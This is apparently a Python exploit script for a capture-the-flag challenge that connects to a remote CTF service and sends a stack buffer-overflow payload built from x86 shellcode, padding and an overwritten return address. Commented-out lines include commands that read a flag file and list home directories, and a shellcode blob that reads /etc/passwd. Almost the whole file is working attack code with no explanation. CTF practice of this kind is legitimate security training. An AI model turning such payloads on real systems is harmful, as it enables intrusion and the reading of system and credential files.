


import sys
import socket
import string
from subprocess import call

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("csie.ctf.tw", 10113))


# http://shell-storm.org/shellcode/files/shellcode-73.php
rounds = 0
while True:

	data = s.recv(40960)
	if not data:
		break

	# data_string = data.decode("utf-8")

	print(data)


	# print(code)
	# print('1'*92)
	if rounds == 0:
		s.send(('\x31\xc0\xb0\x01\x31\xdb\xcd\x80AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x89\x86\x04\x08\n'))
		print len('\x31\xc0\xb0\x01\x31\xdb\xcd\x80AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x89\x86\x04\x08\n')
		# s.send(('\x31\xc0\xb0\x01\x31\xdb\xcd\x80AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x85\x04\x08\n'))
		# s.send(('\x31\xc0\xb0\x01\x31\xdb\xcd\x80AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x89\x86\x04\x08\n'))
		# s.send(('\x31\xc0\xb0\x01\x31\xdb\xcd\x80AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x70\x84\x04\x08\n'))
	# s.send(('cat /home/vash/flag\n').encode())	
	# s.send(('ls /home\n').encode())	
	
	# elif rounds == 1:
		# s.send(('cat /home/vash/flag\n').encode())
	# else:
		# break

	rounds += 1

# 	char main[]=
# "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/etc/passwd";



s.close()